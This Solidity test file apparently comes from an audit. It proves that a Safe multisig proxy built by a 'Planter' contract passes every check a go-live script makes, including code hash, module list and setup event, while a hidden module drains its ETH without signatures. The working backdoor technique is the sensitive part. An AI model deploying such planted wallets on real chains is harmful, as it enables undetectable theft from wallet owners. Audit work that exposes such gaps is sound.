// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, Vm} from "forge-std/Test.sol";

interface IFactory {
    function createProxyWithNonce(address singleton, bytes memory initializer, uint256 saltNonce) external returns (address);
}

interface ISafe {
    function setup(address[] calldata owners, uint256 threshold, address to, bytes calldata data, address fallbackHandler,
        address paymentToken, uint256 payment, address payable paymentReceiver) external;
    function getOwners() external view returns (address[] memory);
    function getThreshold() external view returns (uint256);
    function getModulesPaginated(address start, uint256 pageSize) external view returns (address[] memory array, address next);
    function isModuleEnabled(address module) external view returns (bool);
    function isOwner(address owner) external view returns (bool);
    function execTransactionFromModule(address to, uint256 value, bytes memory data, uint8 operation) external returns (bool);
}

/// Creation code that plants storage, then returns the CANONICAL SafeProxy runtime: the proxy's code hash is canonical, but its
/// storage holds a module (and, optionally, owners) that no linked list names.
contract Planter {
    constructor(bytes memory runtime, address singleton, address hiddenModule) {
        assembly {
            sstore(0, singleton)                                   // slot 0: the singleton
            mstore(0, hiddenModule) mstore(32, 1)                  // modules[hiddenModule] (mapping at slot 1) = SENTINEL
            sstore(keccak256(0, 64), 1)
            return(add(runtime, 32), mload(runtime))
        }
    }
}

/// R4 check, golive-check L-H: every read script/golive-check.sh makes of the owner passes for a Safe whose storage was written by
/// its creation code, not by setup(): the SafeSetup event says `initializer` zero, yet a hidden module executes without signatures.
contract Audit4SafeHidden is Test {
    address constant FACTORY_141 = 0x4e1DCf7AD4e460CfD30791CCC4F9c8a4f820ec67;
    address constant SAFE_L2_141 = 0x29fcB43b46531BcA003ddC8FCB67FFE91900C762;
    address constant HANDLER_141 = 0xfd0732Dc9E303f09fCEf3a7388Ad10A83459Ec99;
    bytes32 constant GUARD_SLOT = 0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8;
    bytes32 constant FALLBACK_SLOT = 0x6c9a6c4a39284e37ed1cf53d337577d14212a4870fb976a4366c693b939918d5;
    bytes32 constant SAFE_SETUP = keccak256("SafeSetup(address,address[],uint256,address,address)");
    // golive-check's SAFE_PROXY_HASHES
    bytes32 constant PROXY_HASH_A = 0xb89c1b3bdf2cf8827818646bce9a8f6e372885f8c55e5c07acbd307cb133b000;
    bytes32 constant PROXY_HASH_B = 0xd7d408ebcd99b2b70be43e20253d6d92a8ea8fab29bd3be7f55b10032331fb4c;

    function test_audit4_hiddenModulePassesEveryGoliveRead() public {
        // a read-only fork of the public 4663 RPC; opt-in so the ordinary `forge test` stays offline: AUDIT4_FORK=1 forge test --match-contract Audit4SafeHidden
        if (!vm.envOr("AUDIT4_FORK", false)) return;
        vm.createSelectFork("robinhood");
        assertEq(block.chainid, 4663);
        address owner1 = makeAddr("device1"); address owner2 = makeAddr("device2"); address thief = makeAddr("thief");

        // the canonical proxy runtime, as the canonical 1.4.1 factory creates it
        address honest = IFactory(FACTORY_141).createProxyWithNonce(SAFE_L2_141, "", 1);
        bytes memory runtime = honest.code;
        bytes32 h = keccak256(runtime);
        assertTrue(h == PROXY_HASH_A || h == PROXY_HASH_B, "the canonical proxy runtime hash is in golive-check's list");

        // the planted Safe: canonical runtime, canonical singleton, a hidden module, then an ordinary setup() with to = 0
        address safe = address(new Planter(runtime, SAFE_L2_141, thief));
        address[] memory owners = new address[](2);
        owners[0] = owner1; owners[1] = owner2;
        vm.recordLogs();
        ISafe(safe).setup(owners, 2, address(0), "", HANDLER_141, address(0), 0, payable(address(0)));
        Vm.Log[] memory logs = vm.getRecordedLogs();

        // ---- every read golive-check's safecheck() makes ----
        assertEq(keccak256(safe.code), h, "runtime: a canonical Safe proxy");
        assertEq(address(uint160(uint256(vm.load(safe, 0)))), SAFE_L2_141, "slot 0: a canonical singleton");
        (address[] memory mods,) = ISafe(safe).getModulesPaginated(address(1), 10);
        assertEq(mods.length, 0, "getModulesPaginated: no module");
        assertEq(vm.load(safe, GUARD_SLOT), bytes32(0), "no guard");
        assertEq(address(uint160(uint256(vm.load(safe, FALLBACK_SLOT)))), HANDLER_141, "fallback handler: the canonical 1.4.1 one");
        uint256 n;
        address initializer;
        for (uint256 i; i < logs.length; i++) if (logs[i].emitter == safe && logs[i].topics[0] == SAFE_SETUP) {
            n++;
            (, , initializer, ) = abi.decode(logs[i].data, (address[], uint256, address, address));
        }
        assertEq(n, 1, "exactly one SafeSetup event");
        assertEq(initializer, address(0), "SafeSetup: initializer zero (setup() made no delegatecall)");
        assertEq(ISafe(safe).getThreshold(), 2);
        address[] memory got = ISafe(safe).getOwners();
        assertEq(got.length, 2); assertEq(got[0], owner1); assertEq(got[1], owner2);
        assertEq(owner1.code.length + owner2.code.length, 0, "code-less owners, = --safe-owners");

        // ---- yet the thief is a module and moves the Safe's ETH with no owner's signature ----
        assertTrue(ISafe(safe).isModuleEnabled(thief), "isModuleEnabled(thief)");
        vm.deal(safe, 10 ether);
        vm.prank(thief);
        assertTrue(ISafe(safe).execTransactionFromModule(thief, 10 ether, "", 0));
        assertEq(thief.balance, 10 ether, "drained without a signature");
    }
}
